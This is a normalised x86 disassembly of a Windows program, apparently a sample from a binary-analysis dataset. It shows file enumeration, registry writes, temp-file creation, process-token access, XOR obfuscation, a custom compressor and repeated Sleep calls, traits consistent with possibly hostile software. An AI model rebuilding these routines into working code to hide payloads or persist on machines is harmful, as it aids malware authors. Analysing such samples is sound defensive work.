test al al
pop ecx
je r-xdata
pop edi
cmp esi 0x4
jge r-xdata
push [ ebp - 0xc ]
lea ecx [ ebp + 0xc ]
call sub_407e92
mov al [ eax ]
mov [ ebp + esi - 0x8 ] al
inc esi
inc [ ebp - 0xc ]
cmp esi 0x4
jne r-xdata
xor ebx ebx
push 0x4
pop ecx
sub ecx esi
push ecx
lea eax [ ebp + esi - 0x8 ]
push 0x0
push eax
call sub_409951
add esp 0xc
test ebx ebx
jne r-xdata
xor edi edi
lea edi [ ebp + ebx - 0x8 ]
movzx eax [ edi ]
push eax
push r--data
call sub_4058b2
inc ebx
cmp ebx 0x4
pop ecx
pop ecx
mov [ edi ] al
jl r-xdata
mov al [ ebp - 0x7 ]
mov cl [ ebp - 0x8 ]
mov dl [ ebp - 0x7 ]
shr al 0x4
shl cl 0x2
and al 0x3
add al cl
mov [ ebp - 0x4 ] al
mov al [ ebp - 0x6 ]
mov cl al
shr cl 0x2
and cl 0xf
shl dl 0x4
shl al 0x6
add al [ ebp - 0x5 ]
xor cl dl
xor edi edi
dec esi
test esi esi
mov [ ebp - 0x3 ] cl
mov [ ebp - 0x2 ] al
jle r-xdata
push [ ebp - 0xc ]
lea ecx [ ebp + 0xc ]
dec ebx
call sub_407e92
cmp [ eax ] 0x3d
je r-xdata
lea esi [ ebp + edi - 0x8 ]
movzx eax [ esi ]
push eax
push r--data
call sub_4058b2
inc edi
cmp edi 0x4
pop ecx
pop ecx
mov [ esi ] al
jl r-xdata
mov al [ ebp - 0x7 ]
mov cl [ ebp - 0x8 ]
mov dl [ ebp - 0x7 ]
shr al 0x4
shl cl 0x2
and al 0x3
add al cl
mov [ ebp - 0x4 ] al
mov al [ ebp - 0x6 ]
mov cl al
shr cl 0x2
shl al 0x6
add al [ ebp - 0x5 ]
and cl 0xf
shl dl 0x4
xor cl dl
mov [ ebp - 0x3 ] cl
mov [ ebp - 0x2 ] al
xor esi esi
movzx eax [ ebp + edi - 0x4 ]
mov ecx [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x19 ]
push eax
call sub_407f56
lea ecx [ ebp - 0x19 ]
call sub_407e74
inc edi
cmp edi esi
jl r-xdata
movzx eax [ ebp + esi - 0x4 ]
mov ecx [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x19 ]
push eax
call sub_407f56
lea ecx [ ebp - 0x19 ]
call sub_407e74
inc esi
cmp esi 0x3
jl r-xdata
xor esi esi
sub_405aa1
push ebp
mov ebp esp
sub esp 0x144
push ebx
push edi
mov edi 0x3e8
push edi
call sub_409984
push [ ebp + 0x8 ]
mov ebx eax
push ebx
call sub_409ed4
push r--data
push ebx
call sub_409e53
add esp 0x14
lea eax [ ebp - 0x144 ]
push eax
push ebx
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
push ebx
call sub_4092d2
pop ecx
pop edi
pop ebx
leave
retn
push esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call [ ebp + 0x1c ]
add esp 0x10
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
call [ Sleep@IAT ]
push edi
call sub_409984
push [ ebp + 0x8 ]
mov esi eax
push esi
call sub_409ed4
push r--data
push esi
call sub_409e53
lea eax [ ebp - 0x118 ]
push eax
push esi
call sub_409e53
add esp 0x1c
test [ ebp - 0x144 ] 0x10
je r-xdata
pop esi
push esi
call sub_4092d2
pop ecx
lea eax [ ebp - 0x144 ]
push eax
push [ ebp - 0x4 ]
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x118 ]
push r--data
push eax
call sub_409e8e
test eax eax
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x118 ]
push r--data
push eax
call sub_409e8e
test eax eax
pop ecx
pop ecx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_405aa1
add esp 0x18
jmp r-xdata
sub_405bba
push esi
mov esi [ esp + 0xc ]
or [ esi ] 0xffffffff
push edi
xor edi edi
push edi
push edi
push 0x3
push edi
push 0x3
push 0x80000000
push [ esp + 0x24 ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ esi ] eax
jne r-xdata
push edi
push eax
call [ GetFileSize@IAT ]
push edi
push edi
push edi
push 0x2
push edi
push [ esi ]
mov [ esi + 0xc ] eax
call [ CreateFileMappingA@IAT ]
push edi
push edi
push edi
push 0x4
push eax
mov [ esi + 0x4 ] eax
call [ MapViewOfFile@IAT ]
mov [ esi + 0x8 ] eax
xor eax eax
cmp [ esi ] 0xffffffff
setne al
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_405c1c
push esi
mov esi [ esp + 0x8 ]
cmp [ esi ] 0xffffffff
je r-xdata
xor eax eax
pop esi
retn
push edi
push [ esi + 0x8 ]
call [ UnmapViewOfFile@IAT ]
push [ esi + 0x4 ]
mov edi [ CloseHandle@IAT ]
call edi
push [ esi ]
call edi
pop edi
sub_405c4d
push ebp
mov ebp esp
sub esp 0x94
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
call sub_401c44
push r--data
push [ ebp + 0x8 ]
call sub_40948c
mov esi eax
test esi esi
pop ecx
pop ecx
mov [ ebp - 0x1c ] esi
jne r-xdata
push esi
xor ebx ebx
inc ebx
push ebx
lea eax [ ebp - 0x94 ]
push 0x4c
push eax
call sub_40954d
add esp 0x10
cmp eax ebx
jne r-xdata
xor al al
jmp r-xdata
push [ ebp - 0x1c ]
call sub_409393
pop ecx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x15 ]
push [ ebp + 0x8 ]
call sub_407d38
mov ecx eax
call sub_408033
lea ecx [ ebp - 0x15 ]
mov bl al
call sub_407e74
test bl bl
je r-xdata
push 0x4
lea eax [ ebp - 0x94 ]
push r--data
push eax
call sub_4098b9
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov al [ ebp - 0x1 ]
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x80 ]
test bl al
je r-xdata
mov ecx [ ebp - 0x7c ]
shr ecx 0x4
test bl cl
jne r-xdata
push esi
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_40954d
add esp 0x10
cmp eax ebx
jne r-xdata
shr eax 0x1
test bl al
je r-xdata
push esi
call sub_409393
pop ecx
jmp r-xdata
movsx eax [ ebp - 0x8 ]
push ebx
push eax
push esi
call sub_409664
add esp 0xc
test eax eax
je r-xdata
push esi
push ebx
lea eax [ ebp - 0x48 ]
push 0x1c
push eax
call sub_40954d
add esp 0x10
cmp eax ebx
jne r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ ebp - 0x48 ]
cmp eax 0x1c
jb r-xdata
cmp eax 0x1000
jge r-xdata
lea edi [ eax - 0x1c ]
lea eax [ edi + 0x10 ]
push eax
call sub_409984
mov esi eax
test esi esi
pop ecx
je r-xdata
push [ ebp - 0x1c ]
push ebx
push edi
push esi
call sub_40954d
add esp 0x10
cmp eax ebx
jne r-xdata
push esi
call sub_4092d2
pop ecx
mov eax [ ebp - 0x30 ]
lea edi [ eax + esi - 0x1c ]
mov al [ ebp - 0x40 ]
not al
test bl al
je r-xdata
mov eax [ ebp - 0x38 ]
lea eax [ eax + esi - 0x1c ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x34 ]
mov ecx [ ebp + 0xc ]
lea eax [ eax + esi - 0x8 ]
push eax
lea eax [ ebp - 0x29 ]
push eax
call sub_407fed
lea ecx [ ebp - 0x29 ]
call sub_407e74
mov ecx [ ebp + 0xc ]
sub esp 0x10
mov eax esp
push edi
push eax
push r--data
lea eax [ ebp - 0x15 ]
push eax
call sub_407fb6
mov ecx eax
call sub_407fb6
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x29 ]
push eax
call sub_408073
lea ecx [ ebp - 0x29 ]
call sub_407e74
cmp [ edi ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x15 ]
push eax
call sub_407fed
lea ecx [ ebp - 0x15 ]
call sub_407e74
call sub_407e74
mov [ ebp - 0x1 ] bl
mov ecx [ ebp + 0xc ]
sub esp 0x10
cmp [ ecx + 0x8 ] 0x0
mov eax esp
push edi
push eax
jne r-xdata
push r--data
lea eax [ ebp - 0x29 ]
push eax
call sub_407fb6
mov ecx eax
call sub_407fb6
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x15 ]
push eax
call sub_408073
lea ecx [ ebp - 0x15 ]
call sub_407e74
lea ecx [ ebp - 0x29 ]
call sub_407fb6
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x15 ]
push eax
call sub_408073
jmp r-xdata
lea ecx [ ebp - 0x15 ]
jmp r-xdata
sub_405e8e
push ebx
push ebp
push esi
push edi
mov edi [ Sleep@IAT ]
push 0x32
call edi
push 0x32
call edi
mov esi 0x1f4
push esi
call sub_409984
mov ebp [ GetModuleHandleA@IAT ]
pop ecx
push esi
mov ebx eax
push ebx
push 0x0
call ebp
push eax
call [ GetModuleFileNameA@IAT ]
push ebx
mov [ ebx + 0x58 ] 0x74
call sub_4092d2
pop ecx
push 0x32
call edi
push esi
call sub_409984
pop ecx
push esi
mov edi eax
push edi
push 0x0
call ebp
push eax
call [ GetModuleFileNameA@IAT ]
push edi
mov [ edi + 0xaf ] 0x74
call sub_4092d2
pop ecx
pop edi
pop esi
pop ebp
pop ebx
retn
sub_405ef9
push ecx
push ebx
push ebp
push esi
mov esi [ Sleep@IAT ]
push edi
push 0x32
call esi
push 0x32
call esi
mov edi [ GetCurrentProcess@IAT ]
call edi
mov ebx [ OpenProcessToken@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x28
push eax
call ebx
test eax eax
mov ebp [ CloseHandle@IAT ]
je r-xdata
push 0x32
call esi
call edi
lea ecx [ esp + 0x10 ]
push ecx
push 0x28
push eax
call ebx
test eax eax
je r-xdata
push [ esp + 0x10 ]
call ebp
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push [ esp + 0x10 ]
call ebp
sub_405f54
push ebx
push ebp
push esi
mov esi [ Sleep@IAT ]
push edi
push 0x32
call esi
mov edi 0x1f4
push edi
call sub_409984
pop ecx
mov ebx eax
push ebx
push 0x12c
call [ GetTempPathA@IAT ]
push 0x429
call sub_409984
pop ecx
mov ebp eax
push ebp
push 0x0
push 0x0
push ebx
call [ GetTempFileNameA@IAT ]
push r--data
push ebp
call sub_409e53
push ebx
call sub_4092d2
push ebp
call sub_4092d2
add esp 0x10
push 0x32
call esi
push 0x32
call esi
push edi
call sub_409984
pop ecx
push edi
mov esi eax
push esi
push 0x0
call [ GetModuleHandleA@IAT ]
push eax
call [ GetModuleFileNameA@IAT ]
push esi
mov [ esi + 0x1a ] 0x74
call sub_4092d2
pop ecx
pop edi
pop esi
pop ebp
pop ebx
retn
sub_405fe1
push ebp
mov ebp esp
push ecx
push esi
mov esi [ Sleep@IAT ]
push 0x32
call esi
push 0x32
call esi
call [ GetCurrentProcess@IAT ]
lea ecx [ ebp - 0x4 ]
push ecx
push 0x28
push eax
call [ OpenProcessToken@IAT ]
test eax eax
pop esi
je r-xdata
leave
retn
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
sub_406017
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ Sleep@IAT ]
push edi
push 0x32
call esi
push 0x1f4
call sub_409984
pop ecx
mov edi eax
push edi
push 0x12c
call [ GetTempPathA@IAT ]
push 0x43d
call sub_409984
pop ecx
mov ebx eax
push ebx
push 0x0
push 0x0
push edi
call [ GetTempFileNameA@IAT ]
push r--data
push ebx
call sub_409e53
push edi
call sub_4092d2
push ebx
call sub_4092d2
add esp 0x10
push 0x32
call esi
push 0x32
call esi
call [ GetCurrentProcess@IAT ]
lea ecx [ ebp - 0x4 ]
push ecx
push 0x28
push eax
call [ OpenProcessToken@IAT ]
test eax eax
pop edi
pop esi
pop ebx
je r-xdata
leave
retn
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
sub_4060a1
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov [ ebp - 0xc ] 0x3
push [ ebp + 0x8 ]
call [ RegOpenKeyA@IAT ]
test eax eax
je r-xdata
push esi
mov esi [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
xor eax eax
leave
retn
xor eax eax
jmp r-xdata
push [ ebp - 0x8 ]
call sub_409984
pop ecx
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
lea ecx [ ebp - 0x8 ]
push ecx
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call esi
test eax eax
je r-xdata
pop esi
leave
retn
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
xor eax eax
inc eax
sub_406121
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegCreateKeyA@IAT ]
test eax eax
je r-xdata
push esi
push [ ebp - 0x4 ]
mov esi [ RegCloseKey@IAT ]
call esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyA@IAT ]
test eax eax
je r-xdata
xor eax eax
leave
retn
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x3
push 0x0
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
push [ ebp - 0x4 ]
call esi
xor eax eax
inc eax
xor eax eax
jmp r-xdata
pop esi
leave
retn
sub_406186
push ebp
mov ebp esp
sub esp 0x18
push esi
lea eax [ ebp - 0x8 ]
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push [ ebp + 0x8 ]
call [ RegQueryInfoKeyA@IAT ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call [ FileTimeToSystemTime@IAT ]
push 0x64
call sub_409984
mov esi eax
movzx eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x10 ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
movzx eax [ ebp - 0x16 ]
push eax
movzx eax [ ebp - 0x18 ]
push eax
push r--data
push esi
call sub_409dc9
add esp 0x24
push esi
push esi
call [ lstrlenA@IAT ]
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx [ ebp + 0xc ]
call sub_407870
push esi
call sub_4092d2
pop ecx
xor eax eax
pop esi
leave
retn
sub_406215
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
xor edi edi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
mov [ esi + 0xa ] di
mov [ esi + 0x8 ] di
mov [ esi + 0xc ] di
mov [ esi + 0x6 ] 0x1
mov [ esi + 0x2 ] 0x1
mov [ esi ] 0x76c
mov [ esi + 0x4 ] 0x1
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
pop edi
mov eax esi
pop esi
leave
retn
lea eax [ ebp - 0xc ]
push eax
push edi
push edi
push edi
push edi
push edi
push edi
push edi
push edi
push edi
push edi
push [ ebp - 0x4 ]
call [ RegQueryInfoKeyA@IAT ]
push esi
lea eax [ ebp - 0xc ]
push eax
call [ FileTimeToSystemTime@IAT ]
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
sub_40628d
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_409f34
push [ ebp + 0xc ]
mov esi eax
mov [ ebp - 0x14 ] esi
call sub_409f34
mov edi eax
lea ecx [ esi + 0x1 ]
lea eax [ edi + 0x1 ]
imul eax ecx
push eax
call sub_409984
mov ebx eax
mov eax edi
imul eax esi
push eax
push 0x0
push ebx
mov [ ebp - 0xc ] ebx
call sub_409951
and [ ebp - 0x4 ] 0x0
add esp 0x18
test esi esi
jle r-xdata
xor bl bl
xor ecx ecx
test esi esi
jle r-xdata
mov edx ebx
sub edx edi
mov [ ebp - 0x8 ] ebx
dec edx
push [ ebp - 0xc ]
call sub_4092d2
pop ecx
pop edi
pop esi
mov al bl
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
lea eax [ eax + edi - 0x1 ]
inc [ ebp - 0x4 ]
add [ ebp - 0x8 ] edi
add edx edi
cmp [ ebp - 0x4 ] esi
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov ebx [ ebp - 0x4 ]
add ebx ecx
mov [ ebp - 0x10 ] ebx
mov bl 0x1
inc ecx
add eax edi
cmp ecx esi
jl r-xdata
xor eax eax
test edi edi
jle r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp cl 0x3f
je r-xdata
movsx edx [ eax ]
cmp edx edi
je r-xdata
jmp r-xdata
xor ecx ecx
inc ecx
test eax eax
jle r-xdata
cmp cl 0x2a
jne r-xdata
mov ecx [ ebp + 0xc ]
mov cl [ eax + ecx ]
mov ebx [ ebp - 0x10 ]
cmp [ ebx ] cl
je r-xdata
movsx ecx [ edx + eax ]
inc ecx
jmp r-xdata
inc eax
cmp eax edi
jl r-xdata
mov ebx [ ebp - 0x4 ]
test ebx ebx
jle r-xdata
mov ebx [ ebp - 0x8 ]
mov [ ebx + eax ] cl
xor ecx ecx
inc ecx
test eax eax
jle r-xdata
xor esi esi
inc esi
movsx esi [ edx + eax + 0x1 ]
jmp r-xdata
movsx ecx [ edx + eax ]
inc ecx
jmp r-xdata
test ebx ebx
jle r-xdata
test ebx ebx
jle r-xdata
cmp ecx esi
jle r-xdata
test ebx ebx
jle r-xdata
xor ecx ecx
inc ecx
movsx ecx [ edx + eax + 0x1 ]
jmp r-xdata
test eax eax
jle r-xdata
mov esi [ ebp - 0x8 ]
mov [ esi + eax ] cl
mov esi [ ebp - 0x14 ]
jmp r-xdata
movsx ecx [ edx + eax ]
inc ecx
jmp r-xdata
sub_4063c6
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi [ ebp + 0x10 ]
imul esi esi 0x3
push edi
xor ecx ecx
push 0x2
pop edx
mov eax esi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_409984
pop ecx
push esi
push eax
push 0xffffffff
push [ ebp + 0xc ]
xor edi edi
push edi
push edi
mov [ ebp + 0x10 ] eax
call [ MultiByteToWideChar@IAT ]
push esi
mov [ ebp - 0x4 ] eax
call sub_409984
pop ecx
push edi
push edi
push esi
mov ebx eax
push ebx
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
push edi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ecx [ ebp + 0x8 ]
mov esi eax
call sub_407e64
cmp esi edi
jle r-xdata
push [ ebp + 0x10 ]
call sub_4092d2
push ebx
call sub_4092d2
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
movzx eax [ edi + ebx ]
mov ecx [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x11 ]
push eax
call sub_407f56
lea ecx [ ebp - 0x11 ]
call sub_407e74
inc edi
cmp edi esi
jl r-xdata
sub_406466
push ebx
xor ebx ebx
cmp [ esp + 0x10 ] ebx
push edi
mov edi [ esp + 0xc ]
jbe r-xdata
mov eax edi
pop edi
pop ebx
retn
push esi
mov esi [ esp + 0x14 ]
sub esi edi
inc ebx
cmp ebx [ esp + 0x18 ]
jb r-xdata
push 0x1
call [ Sleep@IAT ]
test bl 0x4
lea eax [ ebx + edi ]
mov cl [ esi + eax ]
mov [ eax ] cl
je r-xdata
pop esi
sub_40649d
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
imul eax eax 0x3
cdq
sub eax edx
push esi
mov esi [ ebp + 0x10 ]
sar eax 0x1
mov [ esi ] eax
add eax 0x9
push edi
push eax
call sub_409984
mov edi [ ebp + 0x14 ]
mov [ edi ] eax
xor ecx ecx
push 0x4
pop edx
lea eax [ ebx + 0x11170 ]
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_409984
push eax
mov [ ebp + 0x8 ] eax
mov eax [ edi ]
push ebx
add eax 0x9
push eax
push [ ebp + 0xc ]
call sub_40686a
push [ ebp + 0x8 ]
mov [ esi ] eax
call sub_4092d2
xor eax eax
add esp 0x1c
cmp [ esi ] eax
mov [ ebp + 0x8 ] eax
jle r-xdata
mov eax [ edi ]
mov cl [ rw-data ]
mov [ eax ] cl
mov eax [ edi ]
mov [ eax + 0x1 ] ebx
mov eax [ edi ]
mov ecx [ esi ]
pop edi
mov [ eax + 0x5 ] ecx
add [ esi ] 0x9
pop esi
pop ebx
pop ebp
retn
mov ecx [ edi ]
lea ecx [ ecx + eax + 0x9 ]
cdq
mov [ ebp + 0x10 ] ecx
mov ecx 0xc8
idiv ecx
mov eax [ ebp + 0x10 ]
add dl 0x28
xor [ eax ] dl
mov eax [ ebp + 0x8 ]
inc eax
cmp eax [ esi ]
mov [ ebp + 0x8 ] eax
jl r-xdata
sub_406548
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov al [ edi ]
mov ebx [ edi + 0x5 ]
cmp ebx 0x5
mov ecx [ edi + 0x1 ]
mov [ ebp + 0xf ] al
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
jne r-xdata
mov cl [ ebp + 0xf ]
cmp cl [ rw-data ]
jge r-xdata
cmp ecx 0x4
jne r-xdata
xor eax eax
test ebx ebx
mov [ ebp + 0xc ] eax
jle r-xdata
lea ecx [ eax - 0x9 ]
cmp ebx ecx
je r-xdata
mov ecx 0xdbba0
lea ebx [ eax - 0x9 ]
mov [ ebp - 0x4 ] ecx
mov [ esi ] ecx
mov eax [ ebp - 0x4 ]
add eax 0xa
push eax
mov [ esi ] eax
call sub_409984
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
push [ esi ]
push ebx
push eax
lea eax [ edi + 0x9 ]
push eax
call sub_406ad3
add esp 0x14
cmp eax 0xffffffff
jne r-xdata
cdq
mov ecx 0xc8
idiv ecx
mov eax [ ebp + 0xc ]
add dl 0x28
xor [ edi + eax + 0x9 ] dl
inc eax
cmp eax ebx
mov [ ebp + 0xc ] eax
jl r-xdata
push eax
mov [ esi ] eax
call sub_409984
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
push [ esi ]
push edi
push eax
call sub_406466
add esp 0x10
jmp r-xdata
mov [ esi ] eax
mov eax [ ebp + 0x14 ]
push [ eax ]
call sub_4092d2
push ebx
mov [ esi ] ebx
call sub_409984
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
push [ esi ]
push edi
push eax
call sub_406466
add esp 0x14
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_406621
cmp eax [ esp + 0x8 ]
jae r-xdata
retn
push esi
mov esi [ esp + 0x8 ]
lea ecx [ edx + eax ]
sub esi edx
pop esi
inc eax
inc ecx
cmp eax [ esp + 0xc ]
jb r-xdata
mov dl [ esi + ecx ]
cmp dl [ ecx ]
jne r-xdata
sub_406642
mov ecx [ esp + 0x4 ]
push esi
push edi
push 0x5
mov edi eax
shr ecx 0x3
pop eax
lea esi [ eax - 0x1 ]
test esi esi
jl r-xdata
shl ecx 0x7
dec eax
cmp eax 0x2
jge r-xdata
pop edi
pop esi
retn
mov ecx esi
imul ecx ecx 0x7
test ecx 0xfe000000
jne r-xdata
mov [ edi ] dl
inc edi
dec esi
sub ecx 0x7
test esi esi
jge r-xdata
or edx 0x80
mov edx [ esp + 0xc ]
shr edx cl
and edx 0x7f
test esi esi
jle r-xdata
sub_40668e
push esi
push edi
push 0x1
mov esi eax
call [ Sleep@IAT ]
xor ecx ecx
xor eax eax
movzx edx [ esi ]
mov edi edx
and edi 0x7f
shl ecx 0x7
inc esi
or ecx edi
inc eax
test dl dl
js r-xdata
mov edx [ esp + 0xc ]
pop edi
mov [ edx ] ecx
pop esi
retn
sub_4066ba
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
sub esp 0x420
xor eax eax
cmp edx 0x1
jb r-xdata
leave
retn
push esi
push edi
mov esi 0x100
mov ecx esi
lea edi [ ebp - 0x420 ]
[ edi ]
xor ecx ecx
test edx edx
jbe r-xdata
xor eax eax
mov [ ebp - 0x1 ] 0x0
inc eax
mov eax [ ebp + 0x8 ]
movzx eax [ ecx + eax ]
lea eax [ ebp + eax * 4 - 0x420 ]
inc [ eax ]
inc ecx
cmp ecx edx
jb r-xdata
inc eax
cmp eax esi
jb r-xdata
mov [ ebp - 0x1 ] al
movzx ecx [ ebp - 0x1 ]
mov edi [ ebp + eax * 4 - 0x420 ]
cmp edi [ ebp + ecx * 4 - 0x420 ]
jae r-xdata
mov edi [ ebp + 0xc ]
mov al [ ebp - 0x1 ]
push ebx
xor ebx ebx
xor esi esi
mov [ edi ] al
mov [ ebp - 0x8 ] ebx
inc esi
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax 0xf4240
cmp ebx eax
mov [ ebp - 0x1c ] eax
ja r-xdata
mov eax [ ebp + 0x8 ]
push 0x1
add ebx eax
call [ Sleep@IAT ]
and [ ebp - 0x10 ] 0x0
push 0x3
pop ecx
cmp [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
jb r-xdata
mov [ ebp - 0x1c ] ebx
mov bl [ ebx ]
inc [ ebp - 0x8 ]
mov [ esi + edi ] bl
inc esi
cmp bl [ ebp - 0x1 ]
jne r-xdata
lea eax [ ebx - 0x3 ]
mov [ ebp - 0x20 ] eax
dec [ ebp - 0xc ]
jmp r-xdata
mov [ esi + edi ] 0x0
inc esi
inc [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
cmp eax [ ebp - 0x1c ]
jbe r-xdata
mov al [ ecx + ebx ]
cmp al [ edx + ecx ]
jne r-xdata
cmp [ ebp - 0xc ] 0x3
ja r-xdata
mov al [ ebx ]
mov edx [ ebp - 0x20 ]
cmp al [ edx ]
jne r-xdata
cmp ecx 0x8
jae r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x14 ]
jb r-xdata
mov ebx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
pop ebx
jmp r-xdata
mov al [ ebp - 0x1 ]
mov [ esi + edi ] al
inc esi
lea eax [ esi + edi ]
push ecx
call sub_406642
push [ ebp - 0x10 ]
add esi eax
lea eax [ esi + edi ]
call sub_406642
add esi eax
mov eax [ ebp - 0x18 ]
add [ ebp - 0x8 ] eax
sub [ ebp - 0xc ] eax
pop ecx
pop ecx
cmp ecx 0x4
jne r-xdata
push eax
push ebx
xor eax eax
call sub_406621
cmp eax [ ebp - 0x18 ]
pop ecx
pop ecx
jbe r-xdata
mov eax [ ebp - 0x14 ]
cmp edx [ ebp + 0x10 ]
jb r-xdata
cmp ecx 0x5
jne r-xdata
cmp [ ebp - 0x10 ] 0x7f
jbe r-xdata
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov al [ edx + eax ]
mov cl [ ebp - 0x1 ]
cmp al cl
jne r-xdata
pop edi
mov eax esi
pop esi
cmp ecx 0x6
jne r-xdata
cmp [ ebp - 0x10 ] 0x3fff
jbe r-xdata
mov [ esi + edi ] al
mov [ esi + edi ] cl
inc esi
mov [ esi + edi ] 0x0
jmp r-xdata
cmp ecx 0x7
jne r-xdata
cmp [ ebp - 0x10 ] 0x1fffff
jbe r-xdata
inc esi
inc edx
cmp [ ebp - 0x10 ] 0xfffffff
jbe r-xdata
sub_40686a
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
sub esp 0x420
cmp edx 0x10000000
push esi
push edi
jbe r-xdata
xor eax eax
cmp edx 0x1
jb r-xdata
test edx edx
jbe r-xdata
pop edi
pop esi
leave
retn
push ebx
mov esi 0x10000
mov ebx 0x1388
mov eax edx
jmp r-xdata
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
sub eax esi
mov edi edx
lea ecx [ edx - 0x1 ]
xor eax eax
test ecx ecx
jbe r-xdata
mov edi [ ebp + 0x14 ]
or [ edi + eax * 4 ] 0xffffffff
inc eax
inc ecx
cmp ecx ebx
jb r-xdata
mov cl [ eax + esi ]
xor cl 0x4b
mov [ esi ] cl
inc esi
dec edi
jne r-xdata
mov eax [ ebp + 0x14 ]
or [ eax + edx * 4 + 0x3fffc ] 0xffffffff
mov esi 0x100
xor eax eax
mov ecx esi
lea edi [ ebp - 0x420 ]
[ edi ]
xor ecx ecx
test edx edx
jbe r-xdata
and [ ebp - 0x8 ] 0x0
cmp eax esi
jae r-xdata
cmp eax esi
jb r-xdata
xor eax eax
mov [ ebp - 0x1 ] 0x0
inc eax
mov eax [ ebp + 0x8 ]
movzx eax [ ecx + eax ]
lea eax [ ebp + eax * 4 - 0x420 ]
inc [ eax ]
inc ecx
